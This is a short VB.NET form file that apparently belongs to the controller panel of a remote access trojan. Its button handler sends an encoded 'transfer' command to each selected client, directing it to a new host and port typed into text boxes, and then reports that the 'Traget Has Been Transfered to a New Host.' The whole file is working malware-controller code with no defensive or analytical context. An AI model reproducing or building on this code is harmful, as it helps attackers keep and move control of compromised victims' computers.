﻿Public Class multit

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Try
                Form1.S.Send(x.Tag, Form1.ENB("transfer") & Form1.Y & Form1.ENB(TextBox1.Text) & Form1.Y & Form1.ENB(TextBox2.Text) & Form1.Y & TextBox3.Text & Form1.Y & Form1.ENB(TextBox4.Text))
            Catch ex As Exception

            End Try
        Next
        MsgBox("Traget Has Been Transfered to a New Host.", MsgBoxStyle.Information, "Done !")
    End Sub
End Class